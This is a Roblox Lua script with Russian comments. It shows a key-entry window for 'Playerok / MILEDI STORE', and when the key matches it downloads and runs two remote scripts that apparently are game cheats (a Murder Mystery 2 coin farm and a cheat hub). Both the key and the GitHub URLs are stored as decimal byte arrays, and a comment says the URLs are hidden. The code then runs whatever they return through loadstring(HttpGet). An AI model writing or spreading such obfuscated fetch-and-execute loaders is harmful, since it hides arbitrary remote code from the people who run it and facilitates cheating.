-- Скрытый ключ
local encodedKey = {80,108,97,121,101,114,111,107,32,77,73,76,69,68,73,32,83,84,79,82,69}
local function checkKey(input)
    if #input ~= #encodedKey then return false end
    for i = 1, #encodedKey do
        if string.byte(input, i) ~= encodedKey[i] then
            return false
        end
    end
    return true
end

-- Скрытые URL скриптов
local script1_bytes = {104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,112,97,119,110,101,114,115,99,114,105,112,116,47,77,117,114,100,101,114,77,121,115,116,101,114,121,50,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,102,97,114,109,99,111,105,110,46,108,117,97}
local script2_bytes = {104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,66,97,99,111,110,66,111,115,115,83,99,114,105,112,116,47,66,101,101,99,111,110,72,117,98,47,109,97,105,110,47,66,101,101,99,111,110,72,117,98}

local function decode(bytes)
    local s = {}
    for _, b in ipairs(bytes) do
        table.insert(s, string.char(b))
    end
    return table.concat(s)
end

-- Интерфейс
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PlayerokKeyUI"
ScreenGui.Parent = PlayerGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 400, 0, 220)
Frame.Position = UDim2.new(0.5, -200, 0.5, -110)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local Logo = Instance.new("TextLabel")
Logo.Text = "Playerok"
Logo.Size = UDim2.new(1, 0, 0, 50)
Logo.Position = UDim2.new(0, 0, 0, 0)
Logo.Font = Enum.Font.GothamBold
Logo.TextSize = 36
Logo.TextColor3 = Color3.fromRGB(255, 255, 255)
Logo.BackgroundTransparency = 1
Logo.Parent = Frame

local Desc = Instance.new("TextLabel")
Desc.Text = "Введите ваш ключ от MILEDI STORE:"
Desc.Size = UDim2.new(1, -40, 0, 40)
Desc.Position = UDim2.new(0, 20, 0, 55)
Desc.Font = Enum.Font.Gotham
Desc.TextSize = 16
Desc.TextWrapped = true
Desc.TextColor3 = Color3.fromRGB(200, 200, 200)
Desc.BackgroundTransparency = 1
Desc.TextXAlignment = Enum.TextXAlignment.Left
Desc.Parent = Frame

local Input = Instance.new("TextBox")
Input.PlaceholderText = "Ключ из Playerok..."
Input.Size = UDim2.new(1, -40, 0, 35)
Input.Position = UDim2.new(0, 20, 0, 100)
Input.Font = Enum.Font.Gotham
Input.TextSize = 16
Input.TextColor3 = Color3.new(1, 1, 1)
Input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Input.BorderColor3 = Color3.fromRGB(60, 60, 60)
Input.ClearTextOnFocus = false
Input.Parent = Frame

local Button = Instance.new("TextButton")
Button.Text = "Подтвердить ключ"
Button.Size = UDim2.new(1, -40, 0, 35)
Button.Position = UDim2.new(0, 20, 0, 150)
Button.Font = Enum.Font.GothamBold
Button.TextSize = 16
Button.TextColor3 = Color3.new(1, 1, 1)
Button.BackgroundColor3 = Color3.fromRGB(0, 170, 90)
Button.BorderSizePixel = 0
Button.Parent = Frame

local ErrorLabel = Instance.new("TextLabel")
ErrorLabel.Text = ""
ErrorLabel.Size = UDim2.new(1, -40, 0, 20)
ErrorLabel.Position = UDim2.new(0, 20, 0, 190)
ErrorLabel.Font = Enum.Font.Gotham
ErrorLabel.TextSize = 14
ErrorLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
ErrorLabel.BackgroundTransparency = 1
ErrorLabel.TextXAlignment = Enum.TextXAlignment.Left
ErrorLabel.Parent = Frame

-- Проверка и запуск
Button.MouseButton1Click:Connect(function()
    if checkKey(Input.Text) then
        ScreenGui:Destroy()
        -- Загружаем оба скрипта из скрытых ссылок
        local success1, err1 = pcall(function()
            loadstring(game:HttpGet(decode(script1_bytes)))()
        end)
        if not success1 then
            warn("Ошибка при загрузке первого скрипта: "..tostring(err1))
        end
        local success2, err2 = pcall(function()
            loadstring(game:HttpGet(decode(script2_bytes)))()
        end)
        if not success2 then
            warn("Ошибка при загрузке второго скрипта: "..tostring(err2))
        end
    else
        ErrorLabel.Text = "❌ Неверный ключ. Получите его на Playerok (MILEDI STORE)"
    end
end)
